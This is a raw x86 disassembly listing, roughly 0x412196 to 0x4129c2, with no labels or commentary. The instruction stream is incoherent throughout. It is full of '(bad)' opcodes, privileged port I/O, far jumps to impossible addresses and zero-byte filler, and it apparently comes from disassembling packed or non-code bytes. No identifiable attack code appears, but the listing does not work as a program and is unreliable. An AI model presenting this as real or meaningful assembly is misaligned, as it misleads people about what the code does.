  412196:	add    bh,bl
  412198:	jmp    0x839e2608
  41219d:	aad    0xff
  41219f:	bound  esi,QWORD PTR [ecx-0xf]
  4121a2:	and    DWORD PTR [ebx-0x23],0x7d
  4121a6:	adc    DWORD PTR [ecx+ebp*8+0x1],esi
  4121aa:	push   0x1d8fd
  4121af:	inc    edx
  4121b0:	lods   eax,DWORD PTR ds:[esi]
  4121b1:	jmp    0x22c2bbc
  4121b6:	mov    DWORD PTR ds:0xa9fffa69,ebp
  4121bc:	bnd jmp 0x22bb284
  4121c2:	mov    DWORD PTR [edx],esi
  4121c4:	shr    DWORD PTR [esi],0x89
  4121c7:	xchg   ebx,eax
  4121c8:	pop    ecx
  4121c9:	mov    ecx,ebp
  4121cb:	sbb    eax,0x2ff4815
  4121d0:	cmp    al,0x83
  4121d2:	clc    
  4121d3:	jno    0x4121b1
  4121d5:	sbb    esi,0x75
  4121d8:	jmp    0xe573acde
  4121dd:	push   ecx
  4121de:	std    
  4121df:	mov    BYTE PTR [ebp+0x11],dl
  4121e2:	inc    eax
  4121e3:	jne    0x412166
  4121e5:	fwait
  4121e6:	imul   esi,DWORD PTR [ecx+ebp*8+0x34],0xffffffc0
  4121eb:	cld    
  4121ec:	std    
  4121ed:	pop    ds
  4121ee:	sbb    al,0x35
  4121f0:	push   0xd340fdfc
  4121f5:	test   DWORD PTR [ecx+ebx*2-0x2c],0x7c81
  4121fd:	add    BYTE PTR [eax],al
  4121ff:	add    BYTE PTR [ecx+0x2],dl
  412202:	test   BYTE PTR [eax+esi*2],0x80
  412206:	(bad)  
  412208:	cwde   
  412209:	repz inc eax
  41220b:	mov    al,0x75
  41220d:	add    ah,bh
  41220f:	xor    al,0xb5
  412211:	jg     0x412252
  412213:	add    esi,DWORD PTR [eax-0x7a]
  412216:	nop
  412217:	add    al,0x75
  412219:	add    ah,BYTE PTR [edx+0x48]
  41221c:	cdq    
  41221d:	push   ss
  41221e:	bound  esi,QWORD PTR [ebx-0x7b]
  412221:	jge    0x412240
  412223:	jo     0x412299
  412225:	jg     0x41224c
  412227:	sub    dh,ch
  412229:	dec    ebx
  41222a:	jmp    0x412217
  41222c:	dec    esi
  41222d:	inc    edi
  41222e:	call   0xfc0f536
  412233:	add    BYTE PTR [eax-0x55],dh
  412236:	dec    DWORD PTR [edx+0x7ecf1eb9]
  41223c:	dec    esp
  41223d:	outs   dx,BYTE PTR ds:[esi]
  41223e:	jecxz  0x41227a
  412240:	mov    ebp,DWORD PTR [ebp+0x1e]
  412243:	test   DWORD PTR [ebx+0x2],esp
  412246:	push   ebx
  412247:	ss xchg ebx,eax
  412249:	aaa    
  41224a:	push   ebx
  41224b:	and    BYTE PTR [ebx+ebp*2+0x2],dl
  41224f:	lea    esi,[ecx-0x37f724e2]
  412255:	shr    dl,cl
  412257:	les    edi,FWORD PTR [esi]
  412259:	add    ch,bl
  41225b:	mov    ds:0x61d26b75,eax
  412260:	div    dl
  412262:	sbb    ebx,DWORD PTR ds:0x0
  412268:	add    BYTE PTR [edi-0x7b],al
  41226b:	sbb    esp,DWORD PTR [eax]
  41226d:	jge    0x4121f4
  41226f:	sub    esp,DWORD PTR [eax]
  412271:	imul   ebp,edx,0xf2c88693
  412277:	jb     0x4122f0
  412279:	cdq    
  41227a:	sbb    ah,BYTE PTR [ebx+eax*8+0x46]
  41227e:	std    
  41227f:	jmp    FWORD PTR [esi-0x17f1e18e]
  412285:	stc    
  412286:	adc    ecx,DWORD PTR [ecx-0x17e97d23]
  41228c:	jmp    0xd03f15a4
  412291:	lea    edi,ds:0x75f10824
  412297:	and    al,0xf7
  412299:	jbe    0x41230a
  41229b:	sub    eax,edi
  41229d:	cmp    DWORD PTR [esi+0x24],esi
  4122a0:	or     bh,BYTE PTR [esi+eax*4-0x2b]
  4122a4:	das    
  4122a5:	ins    DWORD PTR es:[edi],dx
  4122a6:	lock mov DWORD PTR [ebp-0x5376ed7e],ebp
  4122ad:	xchg   BYTE PTR [ecx+0x169361ff],cl
  4122b3:	mov    DWORD PTR [ebp-0xe78e996],ebx
  4122b9:	push   es
  4122ba:	repnz pop esi
  4122bc:	lahf   
  4122bd:	cdq    
  4122be:	jnp    0x4122a3
  4122c0:	xchg   esp,eax
  4122c1:	cmp    BYTE PTR [ebx],dl
  4122c3:	add    BYTE PTR [ecx],al
  4122c5:	xor    eax,0x2be8ff5f
  4122ca:	ja     0x4122f0
  4122cc:	stc    
  4122cd:	add    BYTE PTR [eax],al
  4122cf:	add    BYTE PTR [eax],al
  4122d1:	add    BYTE PTR [esi],cl
  4122d3:	pop    es
  4122d4:	mov    edx,esi
  4122d6:	or     dh,BYTE PTR ds:0x5614c2c0
  4122dc:	mov    ebp,edx
  4122de:	test   al,0x53
  4122e0:	mov    DWORD PTR [ecx-0x19f3ba12],esp
  4122e6:	and    eax,DWORD PTR [ebx]
  4122e8:	call   0xfe312d7f
  4122ed:	jno    0x412323
  4122ef:	out    dx,al
  4122f0:	test   BYTE PTR [ecx-0x56cef99c],ch
  4122f6:	fisubr WORD PTR [ebp+0x55]
  4122f9:	add    DWORD PTR [ecx-0x33fffffd],eax
  4122ff:	fnstsw WORD PTR [eax-0x7e06c474]
  412305:	shl    BYTE PTR [eax+0x1b016a07],0x73
  41230c:	cld    
  41230d:	call   0x4157e4
  412312:	daa    
  412313:	out    dx,al
  412314:	out    0x2,eax
  412316:	outs   dx,DWORD PTR ds:[esi]
  412317:	stc    
  412318:	cmp    edi,0xc030f1a1
  41231e:	daa    
  41231f:	push   ebx
  412320:	xchg   DWORD PTR [ebx],eax
  412322:	pop    es
  412323:	xchg   BYTE PTR [ecx+eax*1+0x5056055c],cl
  41232a:	aad    0x43
  41232c:	cld    
  41232d:	mov    edx,DWORD PTR [ecx]
  41232f:	or     DWORD PTR [esi+0x50130],edi
  412335:	push   esi
  412336:	add    BYTE PTR [eax],al
  412338:	add    BYTE PTR [eax],al
  41233a:	add    bh,dl
  41233c:	leave  
  41233d:	call   0xfc3ad790
  412342:	test   BYTE PTR [edx+esi*2+0x7bffff21],cl
  412349:	dec    ecx
  41234a:	or     dh,dh
  41234c:	add    edi,DWORD PTR [edi-0x3f]
  41234f:	adc    al,0x4c
  412351:	call   0x47a2c3
  412356:	inc    ecx
  412358:	jmp    0x2c6a:0x3f0c5587
  41235f:	inc    esp
  412360:	jge    0x41232d
  412362:	call   0x3cc0a4
  412367:	nop
  412368:	lds    esi,FWORD PTR [ecx+0xc]
  41236b:	push   edi
  41236c:	lock add DWORD PTR [bx-0x38],edx
  412371:	sti    
  412372:	adc    BYTE PTR [edi+0x6702e7c4],bh
  412378:	mov    al,0x5e
  41237a:	pop    edi
  41237b:	jne    0x4123b1
  41237d:	retf   
  41237e:	ret    0xdb79
  412381:	push   eax
  412382:	mov    ecx,edx
  412384:	or     DWORD PTR [ecx+0xc1dee00],ecx
  41238a:	push   esi
  41238b:	dec    edx
  41238c:	fs mov ecx,0x1db748c
  412392:	push   ebp
  412393:	pandn  mm3,QWORD PTR [ecx-0x75]
  412397:	inc    eax
  412398:	dec    edi
  412399:	jmp    0xf6990307
  41239e:	test   BYTE PTR [eax],al
  4123a0:	add    BYTE PTR [eax],al
  4123a2:	add    BYTE PTR [eax],al
  4123a4:	mov    ch,0xd6
  4123a6:	xor    BYTE PTR [ecx+0x74014700],al
  4123ac:	dec    edx
  4123ad:	pop    edx
  4123ae:	js     0x4123ac
  4123b0:	jne    0x41238f
  4123b2:	mov    eax,ds:0xf507e200
  4123b7:	jae    0x41241a
  4123b9:	adc    cl,BYTE PTR [esp+ecx*4]
  4123bc:	pop    edx
  4123bd:	adc    DWORD PTR [edx+0x6d0ff8f0],ecx
  4123c3:	sbb    dh,bh
  4123c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123c6:	cmc    
  4123c7:	mov    DWORD PTR [eax+0x23894ef1],esi
  4123cd:	adc    dh,BYTE PTR ds:0x7ef932aa
  4123d3:	shl    BYTE PTR [eax+0x6ee84bcf],0x75
  4123da:	repz std 
  4123dc:	addr16 cdq 
  4123de:	push   ebx
  4123df:	pop    esi
  4123e0:	cmp    al,0x9c
  4123e2:	add    BYTE PTR [eax],al
  4123e4:	(bad)  
  4123e5:	es clc 
  4123e7:	xchg   DWORD PTR [esi-0x3ace7523],esi
  4123ed:	(bad)  
  4123ef:	out    dx,al
  4123f0:	(bad)  
  4123f1:	fxtract 
  4123f3:	mov    al,0xf9
  4123f5:	fiadd  DWORD PTR [ecx]
  4123f7:	add    al,dh
  4123f9:	add    bh,BYTE PTR [ebx]
  4123fb:	and    BYTE PTR [ebp+0x5a],ch
  4123fe:	xlat   BYTE PTR ds:[ebx]
  4123ff:	outs   dx,BYTE PTR ds:[esi]
  412400:	jne    0x412404
  412402:	add    DWORD PTR [eax],eax
  412404:	sub    eax,0xaab4da
  412409:	add    BYTE PTR [eax],al
  41240b:	add    BYTE PTR [eax],al
  41240d:	shr    bh,0x6b
  412410:	les    ebp,FWORD PTR [eax-0x6b]
  412413:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412414:	ret    0x279
  412417:	add    DWORD PTR [edi+ebx*1],eax
  41241a:	add    al,BYTE PTR [ecx]
  41241c:	add    al,0xf
  41241e:	add    al,0xd1
  412420:	add    ebx,DWORD PTR [eax-0x6fe7fc8a]
  412426:	adc    eax,0x235144f
  41242b:	bound  ecx,QWORD PTR [eax+0x59]
  41242e:	push   es
  41242f:	jo     0x412474
  412431:	jno    0x412466
  412433:	xor    BYTE PTR [edi+0x35],bh
  412436:	call   FWORD PTR [ebx-0x3c]
  412439:	aaa    
  41243a:	cli    
  41243b:	out    0xb3,al
  41243d:	(bad)  
  41243f:	repz add ebp,esp
  412442:	inc    eax
  412443:	mov    bl,0x0
  412445:	mov    ecx,0x7536df26
  41244a:	add    al,BYTE PTR [edi+0x4]
  41244d:	enter  0x9e0d,0xf4
  412451:	shl    DWORD PTR [esi],0xeb
  412454:	xchg   BYTE PTR [edx+0x516ff652],ch
  41245a:	(bad)  
  41245b:	in     eax,dx
  41245c:	ins    BYTE PTR es:[edi],dx
  41245d:	jns    0x412439
  41245f:	mov    edi,0x3eef188f
  412464:	jg     0x41249b
  412466:	jbe    0x412453
  412468:	mov    bl,0xa
  41246a:	fsub   st(1),st
  41246c:	xor    DWORD PTR ds:0x3efc4,esi
  412472:	add    BYTE PTR [eax],al
  412474:	add    BYTE PTR [eax],al
  412476:	pop    DWORD PTR [ecx]
  412478:	push   0xffffffc2
  41247a:	test   edx,ebx
  41247c:	add    bh,dh
  41247e:	mov    edi,0x7779fdee
  412483:	rcl    DWORD PTR [esi+0x72],0xe7
  412487:	in     al,dx
  412488:	jbe    0x4124c3
  41248a:	loope  0x4124f1
  41248c:	mov    DWORD PTR [esi-0x3abb083f],edx
  412492:	outs   dx,BYTE PTR ds:[esi]
  412493:	out    dx,eax
  412494:	(bad)  
  412495:	out    dx,eax
  412496:	(bad)  
  412497:	imul   eax,DWORD PTR [eax-0x17],0x81560822
  41249e:	inc    edi
  41249f:	jns    0x41249e
  4124a1:	outs   dx,BYTE PTR ds:[esi]
  4124a2:	in     eax,dx
  4124a3:	(bad)  
  4124a4:	pop    esi
  4124a5:	sub    ebx,DWORD PTR [edx-0x658dab12]
  4124ab:	and    ah,0x51
  4124ae:	neg    ebp
  4124b0:	or     al,0xe2
  4124b2:	jbe    0x4124b6
  4124b4:	push   ecx
  4124b5:	lahf   
  4124b6:	inc    ebp
  4124b7:	ret    0xa955
  4124ba:	sti    
  4124bb:	outs   dx,BYTE PTR ds:[esi]
  4124bc:	and    al,0xf9
  4124be:	std    
  4124bf:	aad    0xe8
  4124c1:	arpl   WORD PTR [ecx+0x3],cx
  4124c4:	add    dl,bl
  4124c6:	ss enter 0xc544,0x86
  4124cb:	div    BYTE PTR [ecx+ebp*4+0x76]
  4124cf:	test   DWORD PTR [ebp+eax*8-0x16fffd0a],eax
  4124d6:	out    dx,eax
  4124d7:	xchg   BYTE PTR [eiz*2+0x0],ah
  4124de:	add    BYTE PTR [esi+0x2],dh
  4124e1:	add    BYTE PTR [eax-0x56],ah
  4124e4:	es mov cl,ch
  4124e7:	jbe    0x4124eb
  4124e9:	lds    ebp,FWORD PTR [ebp+0x4d]
  4124ec:	jle    0x4124ee
  4124ee:	jmp    0xe9402769
  4124f3:	jbe    0x412570
  4124f5:	dec    ecx
  4124f6:	stc    
  4124f7:	sub    ebp,0xffffff8c
  4124fa:	add    BYTE PTR [edi-0x7772ab12],dh
  412500:	sbb    bl,BYTE PTR [edx+edx*2]
  412503:	push   edi
  412504:	push   ebp
  412505:	add    al,0x42
  412507:	jle    0x4124c1
  412509:	inc    esp
  41250a:	and    al,0x77
  41250c:	push   es
  41250d:	sti    
  41250e:	push   eax
  41250f:	fadd   DWORD PTR [ebp+0x70580fc0]
  412515:	add    al,BYTE PTR [eax]
  412517:	int3   
  412518:	add    BYTE PTR [esp-0x30],0x51
  41251d:	push   0x0
  41251f:	xchg   BYTE PTR [edi],al
  412521:	sti    
  412522:	je     0x4124dc
  412524:	and    eax,0x7fb0fe8
  412529:	add    BYTE PTR [ecx-0x74efda38],cl
  41252f:	fsub   DWORD PTR ds:0x6c948b18
  412535:	inc    ebp
  412536:	sbb    al,0x15
  412538:	sub    eax,0x6c7cff0c
  41253d:	lock call 0x3c922d
  412543:	add    BYTE PTR [eax],al
  412545:	add    BYTE PTR [eax],al
  412547:	add    BYTE PTR [edx],cl
  412549:	leave  
  41254a:	mov    al,0x8a
  41254c:	xchg   ebx,eax
  41254d:	icebp  
  41254e:	jg     0x4125cc
  412550:	sub    BYTE PTR [ecx],dl
  412552:	add    BYTE PTR [edi],cl
  412554:	fadd   DWORD PTR [edx+eax*1+0x0]
  412558:	pop    esp
  412559:	cmp    DWORD PTR [ebx],0x2472a100
  41255f:	and    al,0xb4
  412561:	fwait
  412562:	add    BYTE PTR [eax],al
  412564:	sbb    al,0x6a
  412566:	std    
  412567:	aas    
  412568:	je     0x4125cc
  41256a:	push   0x1
  41256c:	or     al,0x82
  41256e:	mov    esp,0xcc24
  412573:	add    ah,dl
  412575:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412576:	add    BYTE PTR [eax],al
  412578:	jne    0x412555
  41257a:	fstp   DWORD PTR [ecx-0x71]
  41257d:	fiadd  DWORD PTR [ecx]
  41257f:	mov    eax,ecx
  412581:	(bad)  
  412582:	sbb    eax,0xd9daf2ff
  412587:	sub    al,0xab
  412589:	fild   DWORD PTR [ecx]
  41258b:	std    
  41258c:	gs pop ds
  41258e:	jg     0x4125d4
  412590:	xchg   ecx,eax
  412591:	shl    edx,cl
  412593:	je     0x41252e
  412595:	not    DWORD PTR [ecx-0x77]
  412598:	mov    dl,0x2a
  41259a:	jg     0x4125e0
  41259c:	cdq    
  41259d:	retf   
  41259e:	push   ecx
  41259f:	mov    esi,DWORD PTR [ecx]
  4125a1:	mov    edi,0x419d5019
  4125a6:	js     0x4125a8
  4125a8:	jne    0x412602
  4125aa:	lds    ebx,FWORD PTR [eax]
  4125ac:	add    BYTE PTR [eax],al
  4125ae:	add    BYTE PTR [eax],al
  4125b0:	add    al,bh
  4125b2:	call   0xffdf:0xa1b79302
  4125b9:	xchg   edx,eax
  4125ba:	fidivr DWORD PTR [esi-0x3a]
  4125bd:	mov    bl,0xda
  4125bf:	add    DWORD PTR [eax+0x2c],eax
  4125c2:	(bad)  
  4125c3:	in     al,dx
  4125c4:	mov    DWORD PTR [eax],eax
  4125c6:	repz test edx,edx
  4125c9:	call   0x85b51873
  4125ce:	pusha  
  4125cf:	inc    ebp
  4125d0:	and    al,0x99
  4125d2:	add    BYTE PTR [eax+0x24],cl
  4125d5:	jge    0x4125fb
  4125d7:	js     0x4125e5
  4125d9:	(bad)  
  4125da:	mov    ch,0x25
  4125dc:	sbb    al,0xfe
  4125de:	and    ebx,ecx
  4125e0:	adc    eax,0x84f1fd0c
  4125e5:	xor    eax,0xa8fd0f6e
  4125ea:	leave  
  4125eb:	jle    0x412631
  4125ed:	push   ecx
  4125ee:	int    0xf2
  4125f0:	jae    0x412663
  4125f2:	pusha  
  4125f3:	push   ebp
  4125f4:	and    al,0x51
  4125f6:	add    dh,BYTE PTR [edx-0x3e]
  4125f9:	sbb    eax,0x8f18fed
  4125fe:	xchg   DWORD PTR [edi+0x23c47678],esp
  412604:	sub    BYTE PTR [eax+0x1],ch
  412607:	(bad)  
  412608:	js     0x4125a3
  41260a:	push   ss
  41260b:	iret   
  41260c:	div    edx
  41260e:	jmp    0x4125c6
  412610:	icebp  
  412611:	imul   esp,DWORD PTR [esi],0xdbcb
  412617:	add    BYTE PTR [eax],al
  412619:	add    cl,cl
  41261b:	jns    0x4125c3
  41261d:	icebp  
  41261e:	cmc    
  41261f:	outs   dx,BYTE PTR ds:[esi]
  412620:	ret    
  412621:	add    BYTE PTR [ebp-0x5],dh
  412624:	push   0x72
  412626:	ret    0xe7eb
  412629:	ficom  DWORD PTR [eax]
  41262b:	add    esp,edi
  41262d:	add    ebp,DWORD PTR [ebx+0x7597c386]
  412633:	add    ah,bh
  412635:	add    ch,BYTE PTR [ecx]
  412637:	cld    
  412638:	imul   esi,DWORD PTR [eax+0x3e78a51],0x86ee0275
  412642:	sub    al,BYTE PTR [ecx]
  412644:	out    0x3,eax
  412646:	mov    eax,DWORD PTR [esi+0x2759803]
  41264c:	out    0x23,eax
  41264e:	jmp    0x91f1904f
  412653:	sahf   
  412654:	out    0x3,eax
  412656:	jne    0x41265a
  412658:	fiadd  WORD PTR [esi+0x3e701b2]
  41265e:	adc    BYTE PTR [edx],al
  412660:	out    dx,eax
  412661:	add    esi,DWORD PTR [ebp-0x29]
  412664:	scas   al,BYTE PTR es:[edi]
  412665:	lock leave 
  412667:	idiv   DWORD PTR es:[esi-0xf]
  41266b:	and    eax,0x27504e3
  412670:	xchg   edi,eax
  412671:	jle    0x412624
  412673:	add    BYTE PTR es:[ecx-0x3abb883a],al
  41267a:	pop    edx
  41267b:	fisubr DWORD PTR [esi+0x9a]
  412681:	add    BYTE PTR [eax],al
  412683:	ja     0x412687
  412685:	cmp    DWORD PTR ds:0x6c0d125d,esp
  41268b:	fs jmp 0x41268b
  41268e:	jmp    0x1e656d0b
  412693:	popf   
  412694:	ins    DWORD PTR es:[edi],dx
  412695:	je     0x412688
  412697:	call   0xfdeb:0x746c0d09
  41269e:	jmp    0x6d4e302d
  4126a3:	mov    esi,0xf1e90001
  4126a8:	ins    DWORD PTR es:[edi],dx
  4126a9:	and    al,0xf9
  4126ab:	jbe    0x4126aa
  4126ad:	adc    DWORD PTR [edx+0x72000276],0x7c
  4126b4:	push   ebp
  4126b5:	mov    ebp,DWORD PTR [ebp+0x52]
  4126b8:	push   cs
  4126b9:	add    ecx,ebp
  4126bb:	jbe    0x4126f8
  4126bd:	mov    DWORD PTR [edi+0x700451a5],ebx
  4126c3:	cmp    ah,BYTE PTR [esi]
  4126c5:	adc    BYTE PTR [esi+esi*4+0x72],ah
  4126c9:	lahf   
  4126ca:	push   esi
  4126cb:	imul   ecx,esi,0x13
  4126ce:	test   eax,0xe312776
  4126d3:	jns    0x4126d7
  4126d5:	or     eax,0x34064
  4126da:	jmp    0x5c4d9d44
  4126df:	repnz push ds
  4126e1:	cwde   
  4126e2:	jmp    0x7291295d
  4126e7:	add    BYTE PTR [eax],al
  4126e9:	add    BYTE PTR [eax],al
  4126eb:	add    BYTE PTR [ebx+0x1ec86a12],dh
  4126f1:	lods   eax,DWORD PTR ds:[esi]
  4126f2:	test   al,0xe
  4126f4:	inc    ebp
  4126f5:	xchg   al,al
  4126f7:	add    BYTE PTR [ebx],ch
  4126f9:	cmp    BYTE PTR [edi+edi*8],0x2b
  4126fd:	fisubr DWORD PTR [edi]
  4126ff:	ror    ah,0x2e
  412702:	idiv   BYTE PTR [ebx]
  412704:	push   edx
  412705:	add    al,BYTE PTR [ecx+0x61ca8]
  41270b:	mov    ebp,eax
  41270d:	sbb    al,BYTE PTR [eax-0x78f9f400]
  412713:	test   BYTE PTR [eax+0x7a],dh
  412716:	add    BYTE PTR [eax],al
  412718:	fmul   QWORD PTR [ebx-0x3]
  41271b:	push   ebp
  41271c:	addr16 test eax,0x6670b485
  412722:	add    BYTE PTR [eax],al
  412724:	int3   
  412725:	data16 mov ah,0x24
  412728:	dec    eax
  412729:	(bad)  
  41272a:	(bad)  
  41272b:	inc    DWORD PTR [ebp-0x56]
  41272e:	and    al,0x90
  412730:	int3   
  412731:	add    eax,0xe181e800
  412736:	std    
  412737:	jmp    DWORD PTR [edi]
  412739:	out    dx,al
  41273a:	xor    esi,0x68748a0
  412740:	pop    ss
  412741:	sub    eax,0x12543b0c
  412746:	jno    0x4127b3
  412748:	pop    es
  412749:	sub    eax,0x4f9d8b10
  41274e:	sti    
  41274f:	push   eax
  412750:	add    BYTE PTR [eax],al
  412752:	add    BYTE PTR [eax],al
  412754:	add    BYTE PTR [eax+ebx*8+0x21d08836],dl
  41275b:	psubsb mm6,mm6
  41275e:	gs sti 
  412760:	inc    DWORD PTR [edx]
  412762:	int    0xb4
  412764:	mov    BYTE PTR [ebx+0x707c80d9],ch
  41276a:	jmp    0xd8479b6c
  41276f:	aas    
  412770:	add    al,0xdc
  412772:	pop    ebp
  412773:	or     BYTE PTR [eax],al
  412775:	jne    0x4126fd
  412777:	inc    esp
  412778:	mov    esi,DWORD PTR [ecx+0x2de841bf]
  41277e:	push   ss
  41277f:	add    eax,DWORD PTR [eax]
  412781:	lock sbb bh,ch
  412784:	mov    edx,?
  412786:	in     eax,dx
  412787:	out    dx,al
  412788:	std    
  412789:	push   cs
  41278a:	test   eax,0x6eabf632
  41278f:	cmp    eax,0x54d3b124
  412794:	(bad)  
  412795:	je     0x412772
  412797:	arpl   WORD PTR [ecx-0x47a80057],cx
  41279d:	mov    ebp,0x530001da
  4127a2:	adc    al,0xbc
  4127a4:	or     eax,0xd8f69a2a
  4127a9:	jle    0x412746
  4127ab:	and    al,0x77
  4127ae:	xchg   edx,eax
  4127af:	push   ebx
  4127b0:	std    
  4127b1:	retf   0x5687
  4127b4:	call   0xfe2f8b0f
  4127b9:	add    BYTE PTR [eax],al
  4127bb:	add    BYTE PTR [eax],al
  4127bd:	add    BYTE PTR [edx+0x7580254e],bh
  4127c3:	fild   DWORD PTR [ecx]
  4127c5:	call   0xfe2f9b0c
  4127ca:	inc    edx
  4127cb:	adc    DWORD PTR [edi+edi*8+0x5be8643f],esi
  4127d2:	mov    bh,0xee
  4127d4:	add    ebp,edi
  4127d6:	add    edi,edi
  4127d8:	inc    DWORD PTR [eax-0x2fe28e5]
  4127de:	add    edi,edi
  4127e0:	inc    ebp
  4127e2:	mov    ebx,0x6a5604f1
  4127e7:	scas   al,BYTE PTR es:[edi]
  4127e8:	and    eax,0x35ac4d10
  4127ed:	add    BYTE PTR [ebp+0x5d],dh
  4127f0:	shl    DWORD PTR [esp+edi*2+0x2],0xda
  4127f5:	ret    
  4127f6:	mov    WORD PTR [eax-0x1d],es
  4127f9:	or     dh,BYTE PTR ds:0x69c12ff0
  4127ff:	add    dh,BYTE PTR [edx+edi*2+0x13138421]
  412806:	les    edx,FWORD PTR [eax-0x6a]
  412809:	xor    ah,BYTE PTR [eax]
  41280b:	jl     0x412804
  41280d:	sub    ebx,DWORD PTR [esi-0x57c68d06]
  412813:	pop    edx
  412814:	scas   eax,DWORD PTR es:[edi]
  412815:	add    al,0x75
  412817:	add    bl,dh
  412819:	ja     0x412888
  41281b:	jne    0x412851
  41281d:	lock or eax,0x3c2fe
  412823:	add    BYTE PTR [eax],al
  412825:	add    BYTE PTR [eax],al
  412827:	jne    0x4128a2
  412829:	sub    al,0xf8
  41282b:	lods   al,BYTE PTR ds:[esi]
  41282c:	mov    edi,0x22587ee
  412831:	out    0x3,eax
  412833:	in     al,dx
  412834:	cmp    eax,0xfcd81ab
  412839:	test   BYTE PTR [ecx+0x3e70211],0x4f
  412840:	pminub mm2,mm1
  412843:	and    ch,bh
  412845:	cwde   
  412846:	sub    eax,ecx
  412848:	imul   DWORD PTR [ebx-0x69]
  41284b:	stos   BYTE PTR es:[edi],al
  41284c:	out    0xe7,eax
  41284e:	push   esp
  41284f:	divps  xmm6,XMMWORD PTR [esi+0x77]
  412853:	ins    DWORD PTR es:[edi],dx
  412854:	jne    0x412862
  412856:	in     al,dx
  412857:	cli    
  412858:	cmp    eax,0xe3bbdc63
  41285d:	call   0x6465b465
  412862:	inc    edi
  412863:	jns    0x4128b7
  412865:	aas    
  412866:	jl     0x41285b
  412868:	add    edi,esp
  41286a:	jp     0x412822
  41286c:	out    dx,al
  41286d:	add    al,ch
  41286f:	jo     0x4128ef
  412871:	add    bh,al
  412873:	ja     0x412877
  412875:	add    BYTE PTR [edx+edi*4-0x16],bl
  412879:	push   eax
  41287a:	xchg   ecx,eax
  41287b:	inc    BYTE PTR [ecx]
  41287d:	add    cl,ch
  41287f:	push   ds
  412880:	icebp  
  412881:	ja     0x41286b
  412883:	jbe    0x4128fe
  412885:	clc    
  412886:	fs and ch,dh
  412889:	xor    DWORD PTR [ecx+0x0],0x0
  412890:	ja     0x412894
  412892:	add    BYTE PTR [edx-0x6e],ch
  412895:	jmp    0xe8ff:0x27f4e630
  41289c:	jbe    0x412917
  41289e:	inc    ebx
  41289f:	loope  0x412842
  4128a1:	fidivr DWORD PTR [ebx+0x4b]
  4128a4:	jns    0x4128a8
  4128a6:	sub    DWORD PTR [ecx-0x17d48b07],0x76
  4128ad:	add    al,BYTE PTR [ecx+0x71e6e944]
  4128b3:	hlt    
  4128b4:	dec    eax
  4128b5:	fcmovu st,st(0)
  4128b7:	out    dx,eax
  4128b8:	jbe    0x4128bc
  4128ba:	test   BYTE PTR [ecx-0x60cef2b5],ch
  4128c0:	fnstenv [edx-0xc]
  4128c3:	xchg   ecx,eax
  4128c4:	pop    ebx
  4128c5:	jge    0x4128c4
  4128c7:	xchg   esi,eax
  4128c8:	and    edx,ebx
  4128ca:	pop    ebp
  4128cb:	mov    ax,ds:0xcfaf89e4
  4128d1:	or     al,0xff
  4128d3:	call   0x7db50e4e
  4128d8:	sbb    eax,0x3d81fc43
  4128dd:	push   0x7299e8ff
  4128e2:	clc    
  4128e3:	mov    dh,0x9e
  4128e5:	test   al,0x7b
  4128e7:	call   0x4d84a262
  4128ec:	int    0xc2
  4128ee:	or     al,0x0
  4128f0:	fld    st(1)
  4128f2:	je     0x412900
  4128f4:	add    BYTE PTR [eax],al
  4128f6:	add    BYTE PTR [eax],al
  4128f8:	add    ah,al
  4128fa:	add    eax,DWORD PTR [ebx+0x4168a3ff]
  412900:	or     cl,bl
  412902:	shl    DWORD PTR [ecx+0x5],0xe6
  412906:	xlat   BYTE PTR ds:[ebx]
  412907:	pop    esi
  412908:	jmp    0x4128aa
  41290a:	fs pop esi
  41290c:	or     bh,bh
  41290e:	(bad)  
  41290f:	adc    DWORD PTR [edi+ebp*1],edx
  412912:	inc    edx
  412913:	add    BYTE PTR [ebx+0x324c95a],cl
  412919:	or     al,0x2
  41291b:	xchg   DWORD PTR [ebp+0x18],eax
  41291e:	ins    BYTE PTR es:[edi],dx
  41291f:	inc    esi
  412920:	sub    BYTE PTR [edi+0x5a89fc3c],dl
  412926:	or     al,BYTE PTR [edi+0x46670445]
  41292c:	xor    BYTE PTR [eax+ebp*1],dh
  41292f:	push   eax
  412930:	add    esp,ebx
  412932:	sub    al,0xd2
  412934:	imul   DWORD PTR [ecx-0x4bba7826]
  41293a:	dec    ebp
  41293b:	test   DWORD PTR [esi+0x6c],edi
  41293e:	addr16 inc esi
  412940:	and    al,0x55
  412942:	push   eax
  412943:	xor    al,0xff
  412945:	leave  
  412946:	stc    
  412947:	push   cs
  412948:	inc    eax
  412949:	int3   
  41294a:	sub    al,0xfb
  41294c:	cmp    DWORD PTR [edx+0x1a],esp
  41294f:	jno    0x412973
  412951:	imul   edx,DWORD PTR [ecx+0x53],0x57
  412955:	repz adc edi,esp
  412958:	adc    BYTE PTR [esi+edi*8-0x7c],cl
  41295c:	inc    esi
  41295d:	add    BYTE PTR [eax],al
  41295f:	add    BYTE PTR [eax],al
  412961:	add    al,ah
  412963:	adc    al,0xc3
  412965:	jne    0x412914
  412967:	push   eax
  412968:	call   0xfc1a4438
  41296d:	push   edi
  41296e:	and    al,0xc3
  412970:	xchg   bh,bh
  412972:	jne    0x4129c0
  412974:	pop    esi
  412975:	dec    ch
  412977:	inc    eax
  412978:	imul   edi,ebp,0x13e8ffe3
  41297e:	imul   ecx,ebx,0x8ce80041
  412984:	sub    DWORD PTR [ecx+0x74c2f076],ecx
  41298a:	xchg   edi,eax
  41298b:	outs   dx,BYTE PTR ds:[esi]
  41298c:	aaa    
  41298d:	or     BYTE PTR [ebx+ebp*4-0x1596ec16],ah
  412994:	inc    ecx
  412995:	add    al,bh
  412997:	sbb    dh,BYTE PTR [eax+0x11]
  41299a:	hlt    
  41299b:	jge    0x412996
  41299d:	add    BYTE PTR [ebx+ebx*8+0x1],dh
  4129a1:	je     0x412a12
  4129a3:	in     al,dx
  4129a4:	ss std 
  4129a6:	push   0x754016c7
  4129ab:	jb     0x4129db
  4129ad:	aaa    
  4129ae:	ds dec esi
  4129b0:	pop    ds
  4129b1:	mov    DWORD PTR [ebx-0x29],edi
  4129b4:	push   esi
  4129b5:	push   esi
  4129b6:	pop    ebp
  4129b7:	stc    
  4129b8:	adc    BYTE PTR [edi],bh
  4129ba:	jne    0x412a0f
  4129bc:	add    al,0x0
  4129be:	ins    DWORD PTR es:[edi],dx
  4129bf:	fcmovnu st,st(1)
  4129c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4129c2:	hlt    
